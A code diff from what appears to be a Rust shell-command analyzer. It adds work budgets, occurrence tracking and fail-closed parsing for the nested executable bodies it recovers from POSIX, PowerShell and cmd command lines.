+            quote = ShellLexQuote::Double;
+            index += 1;
+            continue;
+        }
+
+        if byte.is_ascii_whitespace() || matches!(byte, b';' | b'|' | b'&' | b')' | b'}') {
+            word_start = true;
+            index += 1;
+            continue;
+        }
+
+        let active_substitution = shell != ShellType::Cmd
+            && byte == b'$'
+            && matches!(bytes.get(index + 1).copied(), Some(b'(' | b'{'));
+        let active_backtick = shell == ShellType::Posix && byte == b'`';
+        let active_group = byte == b'(' || (byte == b'{' && word_start);
+        if active_substitution || active_backtick || active_group {
+            if candidates >= MAX_EXECUTABLE_SCAN_CANDIDATES {
+                return (raw.get(..index).unwrap_or_default(), true);
+            }
+            candidates += 1;
+            let open = if active_substitution {
+                index + 1
+            } else {
+                index
+            };
+            index = if active_backtick {
+                find_backtick_close(raw, index).map_or(bytes.len(), |close| close + 1)
+            } else {
+                find_shell_delimiter_close(raw, open, shell).map_or(bytes.len(), |close| close + 1)
+            };
+            word_start = false;
+            continue;
+        }
+
+        if word_start {
+            if candidates >= MAX_EXECUTABLE_SCAN_CANDIDATES {
+                return (raw.get(..index).unwrap_or_default(), true);
+            }
+            candidates += 1;
+            word_start = false;
+        }
+        index += 1;
+    }
+
+    (raw, false)
+}
+
+fn bound_executable_bodies(scan: &mut ExecutableSubstitutionScan) -> bool {
+    let mut keep = Vec::with_capacity(scan.bodies.len());
+    let mut retained_bodies = 0usize;
+    let mut retained_bytes = 0usize;
+    let mut exhausted = false;
+
+    for body in &scan.bodies {
+        // Preserve occurrences. Equal source strings at different byte ranges
+        // are distinct execution events and can have different pipe,
+        // redirection, and control-flow parents. Callers that only need unique
+        // strings may deduplicate after analysis; enforcement callers must not.
+        let next_bytes = retained_bytes.saturating_add(body.input.len());
+        if retained_bodies >= MAX_EXECUTABLE_SCAN_BODIES
+            || next_bytes > MAX_EXECUTABLE_SCAN_BODY_BYTES
+        {
+            exhausted = true;
+            keep.push(false);
+            continue;
+        }
+        retained_bodies += 1;
+        retained_bytes = next_bytes;
+        keep.push(true);
+    }
+
+    let mut keep = keep.into_iter();
+    scan.bodies.retain(|_| keep.next().unwrap_or(false));
+    exhausted
+}
+
 /// Structured executable-body scan.  Most callers only need the recovered
 /// bodies and use [`executable_substitutions`]; enforcement callers also retain
 /// `gap` so ambiguous PowerShell invocation never collapses to "no body".
@@ -3601,6 +4155,7 @@ pub(crate) fn executable_substitution_scan(
     raw: &str,
     shell: ShellType,
 ) -> ExecutableSubstitutionScan {
+    let (raw, input_budget_exhausted) = bounded_executable_input(raw);
     let (scan_input, mut heredoc_bodies, heredoc_gap) = if shell == ShellType::Posix {
         let recovery = recover_posix_heredocs(raw);
         (
@@ -3611,18 +4166,13 @@ pub(crate) fn executable_substitution_scan(
     } else {
         (std::borrow::Cow::Borrowed(raw), Vec::new(), None)
     };
-    let scan_input = scan_input.as_ref();
+    let (scan_input, candidate_budget_exhausted) =
+        bounded_executable_candidates(scan_input.as_ref(), shell);
     let mut scan = if shell == ShellType::PowerShell {
         powershell_executable_substitution_scan(scan_input)
     } else {
         let (bodies, gap) = lexical_executable_substitutions(scan_input, shell);
-        ExecutableSubstitutionScan {
-            bodies: bodies
-                .into_iter()
-                .map(|input| ExecutableBody { input, shell })
-                .collect(),
-            gap,
-        }
+        ExecutableSubstitutionScan { bodies, gap }
     };
     for segment in tokenize::tokenize(scan_input, shell) {
         if shell != ShellType::PowerShell
@@ -3659,10 +4209,53 @@ pub(crate) fn executable_substitution_scan(
     if matches!(shell, ShellType::Posix | ShellType::Fish) {
         scan_literal_posix_aliases(scan_input, shell, &mut scan);
     }
-    let mut seen = std::collections::HashSet::new();
-    scan.bodies
-        .retain(|body| seen.insert((body.shell, body.input.clone())));
+    let body_budget_exhausted = bound_executable_bodies(&mut scan);
+    if input_budget_exhausted || candidate_budget_exhausted || body_budget_exhausted {
+        scan.gap = Some(ShellExecutionGap::WorkBudgetExceeded);
+    }
     scan
+}
+
+/// Occurrence-preserving executable bodies for one tokenizer segment.
+pub(crate) fn executable_body_occurrences(
+    segment: &tokenize::Segment,
+    shell: ShellType,
+    outgoing_separator: Option<&str>,
+) -> (Vec<ExecutableBodyOccurrence>, Option<ShellExecutionGap>) {
+    let scan = executable_substitution_scan(&segment.raw, shell);
+    let mut occurrences = Vec::with_capacity(scan.bodies.len());
+    for body in scan.bodies {
+        let (mut relation, parent_range) = body.origin.as_ref().map_or_else(
+            || (ExecutableRelation::Unknown, segment.byte_range.clone()),
+            |origin| {
+                (
+                    origin.relation,
+                    // The scanner works on `segment.raw`; rebase its exact
+                    // local occurrence once, without searching normalized body
+                    // text or guessing which equal argv value owned it.
+                    {
+                        segment
+                            .byte_range
+                            .start
+                            .saturating_add(origin.parent_range.start)
+                            ..segment
+                                .byte_range
+                                .start
+                                .saturating_add(origin.parent_range.end)
+                    },
+                )
+            },
+        );
+        if outgoing_separator == Some("&") {
+            relation = ExecutableRelation::Concurrent;
+        }
+        occurrences.push(ExecutableBodyOccurrence {
+            body,
+            relation,
+            parent_range,
+        });
+    }
+    (occurrences, scan.gap)
 }
 
 pub(crate) fn is_complete_literal_posix_function_definition(
@@ -3679,6 +4272,41 @@ pub(crate) fn is_complete_literal_posix_function_definition(
     )
 }
 
+/// Recover one complete, literal POSIX function definition without executing
+/// its body. The caller owns dispatch state and decides when the body becomes
+/// active. An incomplete or suffix-bearing definition fails closed.
+pub(crate) fn literal_posix_function_definition(
+    segment: &tokenize::Segment,
+) -> Result<Option<(String, String)>, ()> {
+    literal_posix_function_definition_with_body_kind(segment)
+        .map(|definition| definition.map(|(name, body, _)| (name, body)))
+}
+
+/// Like `literal_posix_function_definition`, but preserves whether Bash runs
+/// the function body in the caller (`{ ...; }`) or a subshell (`( ... )`).
+/// Dispatch consumers need this distinction to restore state after invoking a
+/// parenthesized body.
+pub(crate) fn literal_posix_function_definition_with_body_kind(
+    segment: &tokenize::Segment,
+) -> Result<Option<(String, String, PosixFunctionBodyKind)>, ()> {
+    match parse_posix_function_definition(&segment.raw, 0) {
+        PosixFunctionParse::Complete { definition, end }
+            if segment
+                .raw
+                .get(end..)
+                .is_some_and(|suffix| suffix.trim().is_empty()) =>
+        {
+            Ok(Some((
+                definition.name,
+                definition.body,
+                definition.body_kind,
+            )))
+        }
+        PosixFunctionParse::Complete { .. } | PosixFunctionParse::Incomplete { .. } => Err(()),
+        PosixFunctionParse::NotDefinition => Ok(None),
+    }
+}
+
 fn is_complete_literal_posix_brace_group(segment: &tokenize::Segment, shell: ShellType) -> bool {
     if shell != ShellType::Posix || segment.command.as_deref() != Some("{") {
         return false;
@@ -3691,12 +4319,371 @@ fn is_complete_literal_posix_brace_group(segment: &tokenize::Segment, shell: She
         })
 }
 
+/// Recover the body of a complete literal POSIX brace group. Brace groups run
+/// in the current shell, so stateful consumers must not treat this body like a
+/// child-shell substitution.
+pub(crate) fn literal_posix_brace_group_body(
+    segment: &tokenize::Segment,
+) -> Result<Option<String>, ()> {
+    if segment.command.as_deref() != Some("{") {
+        return Ok(None);
+    }
+    let raw = segment.raw.trim();
+    if raw.as_bytes().first() != Some(&b'{') {
+        return Ok(None);
+    }
+    let Some(close) = find_shell_delimiter_close(raw, 0, ShellType::Posix) else {
+        return Err(());
+    };
+    if raw
+        .get(close + 1..)
+        .is_none_or(|suffix| !suffix.trim().is_empty())
+    {
+        return Err(());
+    }
+    raw.get(1..close)
+        .map(|body| Some(body.to_string()))
+        .ok_or(())
+}
+
+/// Recover one complete POSIX subshell group. Unlike a brace group, mutations
+/// made by this body must be discarded by stateful consumers after its facts
+/// have been collected.
+pub(crate) fn literal_posix_subshell_group_body(
+    segment: &tokenize::Segment,
+) -> Result<Option<String>, ()> {
+    let raw = segment.raw.trim();
+    if !raw.starts_with('(') || raw.starts_with("((") {
+        return Ok(None);
+    }
+    let Some(close) = find_shell_delimiter_close(raw, 0, ShellType::Posix) else {
+        return Err(());
+    };
+    if raw
+        .get(close + 1..)
+        .is_none_or(|suffix| !suffix.trim().is_empty())
+    {
+        return Ok(None);
+    }
+    raw.get(1..close)
+        .map(|body| Some(body.to_string()))
+        .ok_or(())
+}
+
 pub(crate) fn executable_substitutions(raw: &str, shell: ShellType) -> Vec<String> {
     executable_substitution_scan(raw, shell)
         .bodies
         .into_iter()
         .map(|body| body.input)
         .collect()
+}
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum ExecutableSubstitutionLimitError {
+    CardinalityExceeded,
+}
+
+fn consume_executable_body_unit(units: &mut usize, max_bodies: usize) -> bool {
+    *units = units.saturating_add(1);
+    *units > max_bodies
+}
+
+/// Conservative allocation-free upper bound for the number of executable
+/// bodies the full recovery pass can emit. The streaming state follows each
+/// shell's literal quotes, escapes, and line comments so regexes and inert data
+/// full of delimiter characters do not consume the executable-body budget.
+/// Substitution openers inside interpolating double quotes remain counted.
+fn executable_body_upper_bound_exceeded(raw: &str, shell: ShellType, max_bodies: usize) -> bool {
+    let mut units = usize::from(!raw.trim().is_empty());
+    if units > max_bodies {
+        return true;
+    }
+
+    let bytes = raw.as_bytes();
+    let mut index = 0usize;
+    let mut quote = None;
+    let mut escaped = false;
+    let mut line_comment = false;
+    let mut token_boundary = true;
+    let mut parameter_depth = 0usize;
+    while index < bytes.len() {
+        let byte = bytes[index];
+        let current_char = (shell == ShellType::PowerShell)
+            .then(|| raw.get(index..)?.chars().next())
+            .flatten();
+        let char_len = current_char.map_or(1, char::len_utf8);
+        if line_comment {
+            if matches!(byte, b'\n' | b'\r') {
+                line_comment = false;
+                token_boundary = true;
+                if consume_executable_body_unit(&mut units, max_bodies) {
+                    return true;
+                }
+            }
+            index += char_len;
+            continue;
+        }
+        if escaped {
+            escaped = false;
+            index += char_len;
+            continue;
+        }
+        match quote {
+            Some(b'\'') => {
+                let closes = if shell == ShellType::PowerShell {
+                    current_char.and_then(tokenize::powershell_quote_kind)
+                        == Some(tokenize::PowerShellQuoteKind::Single)
+                } else {
+                    byte == b'\''
+                };
+                if closes {
+                    let next = raw
+                        .get(index + char_len..)
+                        .and_then(|tail| tail.chars().next());
+                    if shell == ShellType::PowerShell
+                        && next.and_then(tokenize::powershell_quote_kind)
+                            == Some(tokenize::PowerShellQuoteKind::Single)
+                    {
+                        index += char_len + next.map_or(0, char::len_utf8);
+                        continue;
+                    }
+                    quote = None;
+                }
+                index += char_len;
+                continue;
+            }
+            Some(b'"') => {
+                if (shell == ShellType::PowerShell && byte == b'`')
+                    || (matches!(shell, ShellType::Posix | ShellType::Fish) && byte == b'\\')
+                {
+                    escaped = true;
+                } else if (shell == ShellType::PowerShell
+                    && current_char.and_then(tokenize::powershell_quote_kind)
+                        == Some(tokenize::PowerShellQuoteKind::Double))
+                    || (shell != ShellType::PowerShell && byte == b'"')
+                {
+                    quote = None;
+                } else if shell != ShellType::Cmd
+                    && byte == b'$'
+                    && bytes.get(index + 1) == Some(&b'(')
+                {
+                    if consume_executable_body_unit(&mut units, max_bodies) {
+                        return true;
+                    }
+                    index += 1;
+                } else if matches!(shell, ShellType::Posix)
+                    && byte == b'`'
+                    && consume_executable_body_unit(&mut units, max_bodies)
+                {
+                    return true;
+                }
+                index += char_len;
+                continue;
+            }
+            _ => {}
+        }
+
+        if matches!(shell, ShellType::Posix | ShellType::Fish) && parameter_depth > 0 {
+            if byte == b'\\' {
+                escaped = true;
+                index += 1;
+                continue;
+            }
+            if byte == b'$' && bytes.get(index + 1) == Some(&b'{') {
+                parameter_depth = parameter_depth.saturating_add(1);
+                index += 2;
+                continue;
+            }
+            if byte == b'}' {
+                parameter_depth -= 1;
+                index += 1;
+                continue;
+            }
+            if byte == b'$' && bytes.get(index + 1) == Some(&b'(') {
+                if consume_executable_body_unit(&mut units, max_bodies) {
+                    return true;
+                }
+                index += 2;
+                continue;
+            }
+            if byte == b'`' && consume_executable_body_unit(&mut units, max_bodies) {
+                return true;
+            }
+            index += char_len;
+            continue;
+        }
+
+        if matches!(shell, ShellType::Posix | ShellType::Fish)
+            && byte == b'$'
+            && bytes.get(index + 1) == Some(&b'{')
+        {
+            parameter_depth = 1;
+            token_boundary = false;
+            index += 2;
+            continue;
+        }
+
+        if shell == ShellType::PowerShell && byte == b'@' {
+            if let Some(here_string) = tokenize::powershell_here_string(raw, index) {
+                if here_string.kind == tokenize::PowerShellQuoteKind::Double {
+                    let content =
+                        &raw.as_bytes()[here_string.content_start..here_string.content_end];
+                    let mut content_index = 0usize;
+                    let mut content_escaped = false;
+                    while content_index < content.len() {
+                        let content_byte = content[content_index];
+                        if content_escaped {
+                            content_escaped = false;
+                        } else if content_byte == b'`' {
+                            content_escaped = true;
+                        } else if content_byte == b'$'
+                            && content.get(content_index + 1) == Some(&b'(')
+                            && consume_executable_body_unit(&mut units, max_bodies)
+                        {
+                            return true;
+                        }
+                        content_index += 1;
+                    }
+                }
+                index = here_string.end;
+                token_boundary = true;
+                continue;
+            }
+        }
+        if shell == ShellType::PowerShell && byte == b'<' && bytes.get(index + 1) == Some(&b'#') {
+            index += 2;
+            while index + 1 < bytes.len() && !(bytes[index] == b'#' && bytes[index + 1] == b'>') {
+                index += 1;
+            }
+            index = (index + 2).min(bytes.len());
+            token_boundary = true;
+            continue;
+        }
+        if (matches!(shell, ShellType::Posix | ShellType::Fish) && byte == b'\\')
+            || (shell == ShellType::PowerShell && byte == b'`')
+            || (shell == ShellType::Cmd && byte == b'^')
+        {
+            escaped = true;
+            index += 1;
+            continue;
+        }
+        if shell == ShellType::PowerShell {
+            if let Some(kind) = current_char.and_then(tokenize::powershell_quote_kind) {
+                quote = Some(match kind {
+                    tokenize::PowerShellQuoteKind::Single => b'\'',
+                    tokenize::PowerShellQuoteKind::Double => b'"',
+                });
+                token_boundary = false;
+                index += char_len;
+                continue;
+            }
+        } else if byte == b'\'' && shell != ShellType::Cmd {
+            quote = Some(byte);
+            token_boundary = false;
+            index += char_len;
+            continue;
+        }
+        if byte == b'"' && shell != ShellType::PowerShell {
+            quote = Some(byte);
+            token_boundary = false;
+            index += char_len;
+            continue;
+        }
+        if byte == b'#' && token_boundary && shell != ShellType::Cmd {
+            line_comment = true;
+            index += 1;
+            continue;
+        }
+        let substitution =
+            shell != ShellType::Cmd && byte == b'$' && bytes.get(index + 1) == Some(&b'(');
+        let process_substitution = matches!(shell, ShellType::Posix | ShellType::Fish)
+            && matches!(byte, b'<' | b'>')
+            && bytes.get(index + 1) == Some(&b'(');
+        let group_parenthesis = byte == b'('
+            && (shell == ShellType::Cmd
+                || (token_boundary
+                    && !matches!(bytes.get(index.wrapping_sub(1)), Some(b'$' | b'<' | b'>'))));
+        let group_brace = byte == b'{'
+            && token_boundary
+            && bytes
+                .get(index + 1)
+                .is_some_and(|next| next.is_ascii_whitespace());
+        let control_separator = b";\n\r&|".contains(&byte);
+        let backtick_substitution = matches!(shell, ShellType::Posix) && byte == b'`';
+        if (substitution
+            || process_substitution
+            || group_parenthesis
+            || group_brace
+            || control_separator
+            || backtick_substitution)
+            && consume_executable_body_unit(&mut units, max_bodies)
+        {
+            return true;
+        }
+        token_boundary = byte.is_ascii_whitespace() || b";&|(){}<>".contains(&byte);
+        index += char_len;
+    }
+    false
+}
+
+/// Cap-aware executable-body recovery for consumers with a strict nested-body
+/// budget. Cardinality is rejected by a streaming preflight before the full
+/// scanner can allocate body strings or its deduplication set.
+pub(crate) fn executable_substitutions_bounded(
+    raw: &str,
+    shell: ShellType,
+    max_bodies: usize,
+) -> Result<Vec<String>, ExecutableSubstitutionLimitError> {
+    executable_bodies_bounded(raw, shell, max_bodies).map(|bodies| {
+        bodies
+            .into_iter()
+            .map(|body| body.input)
+            .collect::<Vec<_>>()
+    })
+}
+
+pub(crate) fn executable_bodies_bounded(
+    raw: &str,
+    shell: ShellType,
+    max_bodies: usize,
+) -> Result<Vec<ExecutableBody>, ExecutableSubstitutionLimitError> {
+    executable_body_scan_bounded(raw, shell, max_bodies).map(|scan| scan.bodies)
+}
+
+pub(crate) fn executable_body_scan_bounded(
+    raw: &str,
+    shell: ShellType,
+    max_bodies: usize,
+) -> Result<ExecutableSubstitutionScan, ExecutableSubstitutionLimitError> {
+    if executable_body_upper_bound_exceeded(raw, shell, max_bodies) {
+        return Err(ExecutableSubstitutionLimitError::CardinalityExceeded);
+    }
+    let scan = executable_substitution_scan(raw, shell);
+    if scan.bodies.len() > max_bodies {
+        // The streaming upper bound is intentionally conservative; retaining
+        // this guard keeps future scanner extensions fail-closed if they add a
+        // body source without updating the preflight invariant.
+        return Err(ExecutableSubstitutionLimitError::CardinalityExceeded);
+    }
+    Ok(scan)
+}
+
+/// Recover only POSIX lexical child-shell bodies: command/process
+/// substitutions and parenthesized subshell groups. Current-shell controls,
+/// `eval`, and external shell wrappers are deliberately left to stateful
+/// callers so they are not executed twice or with the wrong isolation model.
+pub(crate) fn posix_child_shell_scan_bounded(
+    raw: &str,
+    max_bodies: usize,
+) -> Result<ExecutableSubstitutionScan, ExecutableSubstitutionLimitError> {
+    if executable_body_upper_bound_exceeded(raw, ShellType::Posix, max_bodies) {
+        return Err(ExecutableSubstitutionLimitError::CardinalityExceeded);
+    }
+    let (bodies, gap) = lexical_executable_substitutions(raw, ShellType::Posix);
+    if bodies.len() > max_bodies {
+        return Err(ExecutableSubstitutionLimitError::CardinalityExceeded);
+    }
+    Ok(ExecutableSubstitutionScan { bodies, gap })
 }
 
 const MAX_ENCODED_POWERSHELL_BODY_BYTES: usize = 256 * 1024;
@@ -3736,6 +4723,7 @@ fn push_literal_wrapper_body(
             scan.bodies.push(ExecutableBody {
                 input,
                 shell: child_shell,
+                origin: None,
             });
         }
         Some(_) => {}
@@ -3788,7 +4776,8 @@ fn push_control_prefix_body(
     if first.is_none() {
         record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
     } else if !body.trim().is_empty() {
-        scan.bodies.push(ExecutableBody { input: body, shell });
+        scan.bodies
+            .push(ExecutableBody::without_origin(body, shell));
     }
 }
 
@@ -4016,6 +5005,15 @@ fn scan_find_exec_bodies(args: &[String], shell: ShellType, scan: &mut Executabl
             index += 1;
             continue;
         };
+        let operand_arity = crate::rules::command::find_non_exec_operand_arity(&primary);
+        if operand_arity > 0 {
+            // A predicate value is data even when it is spelled like an action:
+            // `find . -name -exec -print` searches for the literal name
+            // `-exec`; it does not execute `-print`. Skip every consumed word
+            // before looking for a real action primary.
+            index = index.saturating_add(1 + operand_arity);
+            continue;
+        }
         if !matches!(primary.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
             index += 1;
             continue;
@@ -4094,6 +5092,7 @@ fn scan_cmd_for_f_command(args: &[String], scan: &mut ExecutableSubstitutionScan
             scan.bodies.push(ExecutableBody {
                 input: body.to_string(),
                 shell: ShellType::Cmd,
+                origin: None,
             });
         }
     } else if set.starts_with("('") || set.starts_with("(`") {
@@ -4135,6 +5134,7 @@ fn scan_cmd_cli_body(
                 scan.bodies.push(ExecutableBody {
                     input,
                     shell: ShellType::Cmd,
+                    origin: None,
                 });
             }
         } else if outer_shell == ShellType::Cmd {
@@ -4178,6 +5178,7 @@ fn scan_cmd_cli_body(
                 scan.bodies.push(ExecutableBody {
                     input,
                     shell: ShellType::Cmd,
+                    origin: None,
                 });
             } else {
                 record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
@@ -4611,7 +5612,7 @@ fn posix_segment_uses_reserved_time(segment: &tokenize::Segment) -> bool {
         && !matches!(segment.preceding_separator.as_deref(), Some("|" | "|&"))
 }
 
-fn posix_current_scope_dispatch_scan(
+pub(crate) fn posix_current_scope_dispatch_scan(
     segment: &tokenize::Segment,
 ) -> Option<ExecutableSubstitutionScan> {
     let leader_raw = segment.command.as_deref()?;
@@ -4648,7 +5649,16 @@ fn posix_current_scope_dispatch_scan(
     let case_arm = leader.ends_with(')') && !leader.ends_with("()");
     let strict_syntax_leader = matches!(
         leader.as_str(),
-        "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!" | "case" | "coproc"
+        "if" | "then"
+            | "elif"
+            | "else"
+            | "while"
+            | "until"
+            | "do"
+            | "for"
+            | "!"
+            | "case"
+            | "coproc"
     );
     if strict_syntax_leader && !is_strict_posix_reserved_word(leader_raw, &leader) {
         return None;
@@ -4671,6 +5681,7 @@ fn posix_current_scope_dispatch_scan(
                 | "while"
                 | "until"
                 | "do"
+                | "for"
                 | "!"
                 | "case"
                 | "coproc"
@@ -4717,7 +5728,7 @@ fn posix_body_calls_parent_alias(
                 return true;
             }
             *remaining_bodies -= 1;
-            if posix_body_calls_parent_alias(&body, state, depth + 1, remaining_bodies) {
+            if posix_body_calls_parent_alias(&body.input, state, depth + 1, remaining_bodies) {
                 return true;
             }
         }
@@ -4769,6 +5780,7 @@ fn recover_posix_parent_dispatch_body(
                         scan.bodies.push(ExecutableBody {
                             input,
                             shell: ShellType::Posix,
+                            origin: None,
                         });
                     }
                     recovered = true;
@@ -4790,6 +5802,7 @@ fn recover_posix_parent_dispatch_body(
                 scan.bodies.push(ExecutableBody {
                     input: binding.definition.body.clone(),
                     shell: ShellType::Posix,
+                    origin: None,
                 });
                 recovered = true;
             }
@@ -5030,7 +6043,7 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
             let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
             if (nested_gap.is_some() && (!state.aliases.is_empty() || !state.unresolved.is_empty()))
                 || nested_bodies.iter().any(|body| {
-                    posix_body_calls_parent_alias(body, &state, 0, &mut remaining_bodies)
+                    posix_body_calls_parent_alias(&body.input, &state, 0, &mut remaining_bodies)
                 })
             {
                 record_shell_execution_gap(scan, ShellExecutionGap::AmbiguousExecutableBody);
@@ -5121,6 +6134,7 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
                 scan.bodies.push(ExecutableBody {
                     input: binding.definition.body.clone(),
                     shell: ShellType::Posix,
+                    origin: None,
                 });
                 if posix_function_invocation_needs_context(
                     raw,
@@ -5471,6 +6485,7 @@ fn scan_literal_posix_aliases(raw: &str, shell: ShellType, scan: &mut Executable
     scan.bodies.push(ExecutableBody {
         input: expanded,
         shell,
+        origin: None,
     });
 }
 
@@ -5616,6 +6631,7 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                     | "while"
                     | "until"
                     | "do"
+                    | "for"
                     | "!"
                     | "case"
                     | "coproc"
@@ -5647,11 +6663,12 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                 push_control_prefix_body(&args, shell, scan);
             }
         }
+        let replacement_body_start = scan.bodies.len();
         match command.as_str() {
             "sh" | "bash" | "zsh" | "dash" | "ksh" | "csh" | "tcsh" | "ash" | "mksh" => {
                 if let Some(body_index) = shell_command_operand(&args, shell, false) {
                     push_required_literal_wrapper_body(
-                        args.get(body_index..).unwrap_or_default(),
+                        args.get(body_index..=body_index).unwrap_or_default(),
                         shell,
                         ShellType::Posix,
                         scan,
@@ -5666,7 +6683,7 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
             "fish" => {
                 if let Some(body_index) = shell_command_operand(&args, shell, true) {
                     push_required_literal_wrapper_body(
-                        args.get(body_index..).unwrap_or_default(),
+                        args.get(body_index..=body_index).unwrap_or_default(),
                         shell,
                         ShellType::Fish,
                         scan,
@@ -5709,6 +6726,7 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                                 scan.bodies.push(ExecutableBody {
                                     input,
                                     shell: ShellType::PowerShell,
+                                    origin: None,
                                 });
                             }
                             Some(_) => {}
@@ -5792,7 +6810,7 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                 }
                 None => {}
             },
-            "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "!"
+            "if" | "then" | "elif" | "else" | "while" | "until" | "do" | "for" | "!"
                 if shell == ShellType::Posix && strict_posix_control =>
             {
                 push_control_prefix_body(&args, shell, scan);
@@ -5806,6 +6824,33 @@ fn scan_literal_shell_wrappers(raw: &str, shell: ShellType, scan: &mut Executabl
                 push_control_prefix_body(&args, shell, scan);
             }
             _ => {}
+        }
+        if matches!(
+            command.as_str(),
+            "sh" | "bash"
+                | "zsh"
+                | "dash"
+                | "ksh"
+                | "csh"
+                | "tcsh"
+                | "ash"
+                | "mksh"
+                | "fish"
+                | "pwsh"
+                | "powershell"
+                | "cmd"
+                | "eval"
+                | "iex"
+                | "invoke-expression"
+                | "call"
+                | "start"
+        ) {
+            for body in scan.bodies.iter_mut().skip(replacement_body_start) {
+                body.origin.get_or_insert_with(|| ExecutableBodyOrigin {
+                    parent_range: segment.byte_range.clone(),
+                    relation: ExecutableRelation::WrapperReplacement,
+                });
+            }
         }
     }
 }
@@ -6033,8 +7078,11 @@ fn posix_body_calls_parent_function(
             return true;
         }
 
-        let (nested_bodies, nested_gap) =
-            lexical_executable_substitutions(&segment.raw, ShellType::Posix);
+        let (nested_bodies, nested_gap) = lexical_executable_substitutions_bounded(
+            &segment.raw,
+            ShellType::Posix,
+            remaining_bodies,
+        );
         if nested_gap.is_some() && !function_names.is_empty() {
             return true;
         }
@@ -6043,8 +7091,12 @@ fn posix_body_calls_parent_function(
                 return true;
             }
             *remaining_bodies -= 1;
-            if posix_body_calls_parent_function(&body, function_names, depth + 1, remaining_bodies)
-            {
+            if posix_body_calls_parent_function(
+                &body.input,
+                function_names,
+                depth + 1,
+                remaining_bodies,
+            ) {
                 return true;
             }
         }
@@ -6618,9 +7670,20 @@ fn apply_posix_function_state_command(
         return Ok(false);
     }
     if command == "unset" && !function_mode {
-        // Plain `unset name` selects a same-named variable before a function;
-        // ambient variable state is outside this source buffer.
-        return Err(());
+        // Plain `unset name` selects a same-named variable before a function,
+        // and ambient variable state is outside this source buffer. That
+        // ambiguity can only change an answer when a function of that name is
+        // actually tracked here: if none is, neither reading of the builtin
+        // touches a binding this walk knows about, so the walk stays resolved.
+        // Blanket-failing instead blocked every `unset FOO`, a static builtin
+        // the repository's own shell hooks run.
+        let touches_tracked_function = operands.iter().any(|name| {
+            !is_literal_bash_function_name(name, true) || state.contains_key(name.as_str())
+        });
+        if touches_tracked_function {
+            return Err(());
+        }
+        return Ok(false);
     }
     if operands.is_empty() {
         return Ok(false);
@@ -6720,6 +7783,13 @@ fn posix_current_shell_builtin_invocation(
         return Ok(None);
     };
 
+    if command == "!" && is_strict_posix_reserved_word(command_raw, "!") {
+        let Some(target) = segment.args.first() else {
+            return Ok(None);
+        };
+        return posix_current_shell_builtin_from_words(target, &segment.args[1..], 0);
+    }
+
     if command == "time" && posix_segment_uses_reserved_time(segment) {
         let mut index = 0usize;
         if segment
@@ -6745,6 +7815,34 @@ fn posix_current_shell_builtin_invocation(
     posix_current_shell_builtin_from_words(command_raw, &segment.args, 0)
 }
 
+/// Resolve a literal command that executes in the current POSIX shell. The
+/// boolean reports whether `command`/`builtin` suppressed function lookup.
+pub(crate) fn literal_posix_current_shell_command(
+    segment: &tokenize::Segment,
+) -> Result<Option<(String, bool)>, ()> {
+    posix_current_shell_builtin_invocation(segment).map(|invocation| {
+        invocation.map(|invocation| (invocation.command, invocation.bypasses_function_lookup))
+    })
+}
+
+/// Recover the literal body evaluated by a current-shell `eval`, including
+/// `command`/`builtin` and reserved `time` wrappers.
+pub(crate) fn literal_posix_current_shell_eval_body(
+    segment: &tokenize::Segment,
+) -> Result<Option<String>, ()> {
+    let Some(invocation) = posix_current_shell_builtin_invocation(segment)? else {
+        return Ok(None);
+    };
+    if invocation.command != "eval" {
+        return Ok(None);
+    }
+    let mut words = Vec::with_capacity(invocation.args.len());
+    for argument in invocation.args {
+        words.push(static_wrapper_word(&argument, ShellType::Posix).ok_or(())?);
+    }
+    Ok(Some(words.join(" ")))
+}
+
 fn posix_reserved_time_word_at(
     raw_word: &str,
     offset: usize,
@@ -6761,10 +7859,32 @@ fn posix_reserved_time_word_at(
         })
 }
 
+/// Arm a fresh dispatch-scan budget for a top-level scan.
 fn lexical_executable_substitutions(
     raw: &str,
     shell: ShellType,
-) -> (Vec<String>, Option<ShellExecutionGap>) {
+) -> (Vec<ExecutableBody>, Option<ShellExecutionGap>) {
+    let mut remaining_bodies = MAX_POSIX_DISPATCH_JOIN_BODIES;
+    lexical_executable_substitutions_bounded(raw, shell, &mut remaining_bodies)
+}
+
+/// As above, drawing from a caller-owned budget.
+///
+/// This scan and `posix_body_calls_parent_function` call each other, and each
+/// used to arm its own counter, so every nesting level paid the full budget
+/// again and the total cost doubled per level. A line of unmatched `(`
+/// characters therefore took the Web3 parser exponential — 8 of them cost 73ms
+/// and 20 cost 266s, and the `web3_command` fuzz target found it as an OOM.
+/// Threading one budget through the cycle makes the total linear in it.
+///
+/// Exhaustion is fail-closed at every consumer: the scans answer "this body may
+/// reach the parent's dispatch state", and running out returns that answer, so a
+/// tighter effective budget can only widen the reported gap, never narrow it.
+fn lexical_executable_substitutions_bounded(
+    raw: &str,
+    shell: ShellType,
+    remaining_bodies: &mut usize,
+) -> (Vec<ExecutableBody>, Option<ShellExecutionGap>) {
     let bytes = raw.as_bytes();
     let mut bodies = Vec::new();
     let mut functions = std::collections::HashMap::<String, PosixFunctionBinding>::new();
@@ -6774,6 +7894,11 @@ fn lexical_executable_substitutions(
     let mut command_start = true;
     let mut word_start = true;
     let mut assignment_word = false;
+    // Updated by this same lexical traversal so each substitution is bound to
+    // its owning argv occurrence at discovery time. `None` means the command
+    // word, an assignment, or a control position rather than a normal argv.
+    let mut current_argument = None;
+    let mut next_argument = 0usize;
     let mut incomplete = false;
     let mut gap = None;
     let mut i = 0usize;
@@ -6806,7 +7931,14 @@ fn lexical_executable_substitutions(
                     if let Some(command) = posix_function_command_word(segment) {
